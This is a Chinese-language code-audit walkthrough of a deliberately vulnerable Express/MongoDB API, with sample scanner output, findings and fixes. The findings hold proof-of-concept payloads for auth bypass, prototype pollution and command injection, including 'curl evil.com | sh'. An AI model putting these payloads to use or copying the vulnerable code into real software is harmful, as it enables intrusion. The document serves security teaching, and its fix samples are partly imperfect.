# Example: Express + MongoDB 审计

> 演示对一个 Express + Mongoose 项目审计，重点关注原型链污染、NoSQL 注入、IDOR。

## 1. 项目结构

```
express-user-api/
├── package.json
├── src/
│   ├── app.js
│   ├── routes/
│   │   ├── users.js
│   │   └── admin.js
│   ├── controllers/
│   │   ├── userController.js
│   │   └── adminController.js
│   ├── models/
│   │   └── User.js
│   ├── middleware/
│   │   └── auth.js
│   └── utils/
│       └── mergeConfig.js
├── .env.example
└── Dockerfile
```

## 2. 危险代码示例

### 2.1 原型链污染（mergeConfig.js）

```js
// utils/mergeConfig.js
function merge(target, source) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

module.exports = { merge };
```

**风险**：`merge` 在 `__proto__` 路径下会被污染。

### 2.2 NoSQL 注入（userController.js）

```js
// controllers/userController.js
async function login(req, res) {
    const { username, password } = req.body;
    // ❌ 危险：直接传 req.body 到 query
    const user = await User.findOne({
        username: req.body.username,
        password: req.body.password
    });
    if (user) {
        req.session.userId = user._id;
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
}
```

**风险**：`req.body.password = {"$ne": null}` 即绕过认证。

### 2.3 IDOR（userController.js）

```js
async function getUser(req, res) {
    // ❌ 直接用 path 参数查库，无 owner 校验
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Not found' });
    res.json(user);
}
```

### 2.4 命令注入（adminController.js）

```js
const { exec } = require('child_process');

async function runMigration(req, res) {
    const { db_name } = req.body;
    // ❌ 拼接 shell 命令
    exec(`mongorestore --db ${db_name} /backup/${db_name}.dump`, (err, stdout) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, output: stdout });
    });
}
```

### 2.5 弱鉴权（middleware/auth.js）

```js
function authMiddleware(req, res, next) {
    const token = req.headers['authorization'];
    if (!token) return res.status(401).json({ error: 'No token' });
    // ❌ decode 不 verify
    const payload = jwt.decode(token);
    if (!payload) return res.status(401).json({ error: 'Invalid token' });
    req.user = payload;
    next();
}
```

## 3. Agent 审计流程

### 3.1 框架识别

```bash
$ python3 scripts/framework_detect.py ./express-user-api
[OK] profile written to framework_profile.json
     primary_language: javascript
     frameworks: ['express']
     entry_points: 1
```

### 3.2 sink_detect 预筛

```bash
$ python3 scripts/sink_detect.py utils/mergeConfig.js
[FOUND] 1 sink(s):
  L3   [High] proto-pollution-recursive-merge    CWE=CWE-1321
        function merge(target, source) {

$ python3 scripts/sink_detect.py controllers/userController.js
[FOUND] 2 sink(s):
  L8   [High] sqli-db-query-concat               CWE=CWE-89
        const user = await User.findOne({
  L18  [High] idor-direct-findById               CWE=CWE-639
        const user = await User.findById(req.params.id);

$ python3 scripts/sink_detect.py controllers/adminController.js
[FOUND] 1 sink(s):
  L8   [Critical] rce-child-exec                 CWE=CWE-78
        exec(`mongorestore --db ${db_name} ...`)

$ python3 scripts/sink_detect.py middleware/auth.js
[FOUND] 1 sink(s):
  L8   [Critical] jwt-decode-no-verify           CWE=CWE-347
        const payload = jwt.decode(token);
```

### 3.3 LLM 推理

#### Finding: 原型链污染 RCE

```yaml
finding:
  id: FND-0001
  title: mergeConfig.merge 存在原型链污染
  file: src/utils/mergeConfig.js
  file_line: 3
  call_chain:
    - userController.importConfig(req.body.config)         # line 35
    - merge({}, req.body.config)                          # line 40
    - merge(target, source)  // recursive                 # line 3  ← 漏洞
  source: req.body.config  (HTTP body)
  exploit_poc: '{"__proto__":{"polluted":"yes"}}'
  impact: 污染 Object.prototype，影响所有对象
  severity: High
  cwe: CWE-1321
  owasp: A08:2021
  vuln_class: prototype-pollution
  confidence: Confirmed
```

#### Finding: NoSQL 注入 Auth Bypass

```yaml
finding:
  id: FND-0002
  title: userController.login 存在 NoSQL 注入认证绕过
  file: src/controllers/userController.js
  file_line: 8
  call_chain:
    - POST /api/login (Express)
    - userController.login(req, res)
    - User.findOne({username: req.body.username, password: req.body.password})  ← 漏洞
  source: req.body
  exploit_poc: '{"username":"admin","password":{"$ne":null}}'
  severity: Critical
  cwe: CWE-943
  owasp: A03:2021
  vuln_class: nosqli
  confidence: Confirmed
```

#### Finding: 命令注入

```yaml
finding:
  id: FND-0003
  title: adminController.runMigration 存在命令注入
  file: src/controllers/adminController.js
  file_line: 8
  call_chain:
    - POST /api/admin/migrate
    - adminController.runMigration(req, res)
    - exec(`mongorestore --db ${db_name} /backup/${db_name}.dump`)  ← 漏洞
  exploit_poc: '{"db_name":"x; curl evil.com | sh"}'
  severity: Critical
  cwe: CWE-78
  vuln_class: cmdi
```

#### Finding: JWT 验证缺失

```yaml
finding:
  id: FND-0004
  title: middleware/auth 使用 jwt.decode 而非 verify
  file: src/middleware/auth.js
  file_line: 8
  call_chain:
    - 全局中间件
    - jwt.decode(token)  ← 仅 base64 decode
  severity: Critical
  cwe: CWE-347
  vuln_class: jwt-vuln
```

### 3.4 修复建议样例

```js
// utils/mergeConfig.js
// Before
function merge(target, source) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// After (1: 过滤危险 key)
function merge(target, source) {
    for (const key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // 跳过危险 key
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// After (2: 改用安全库)
const { merge } = require('lodash');  // lodash >= 4.17.21 过滤 __proto__
```

```js
// controllers/userController.js
// Before
const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
});

// After (强制 string)
async function login(req, res) {
    const username = String(req.body.username);
    const password = String(req.body.password);
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input' });
    }
    const user = await User.findOne({ username, password });
    ...
}

// After (使用 mongoose 强 schema + sanitize)
// User.js: 加 sanitize
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true, select: false }
});
```

## 4. 报告产出

```bash
$ python3 scripts/render_report.py \
    --findings findings.json \
    --assets assets.json \
    --profile framework_profile.json \
    --output code-audit-report.html \
    --project-name "express-user-api" \
    --target "./express-user-api" \
    --mode full

[OK] report written to code-audit-report.html
     total findings: 6
```

## 5. 关键点

1. **merge 是隐藏的危险函数** — 不在 `signatures/dangerous-functions.md` 显式列出，但 LLM 推理会发现
2. **NoSQL 注入的修复** — 不仅是参数化，还要**类型校验**（强制 string）
3. **JWT 错误比缺 JWT 更危险** — `jwt.decode` 给人"已认证"的错觉
4. **PoC 形态** — JSON 字符串（前端攻击向量）
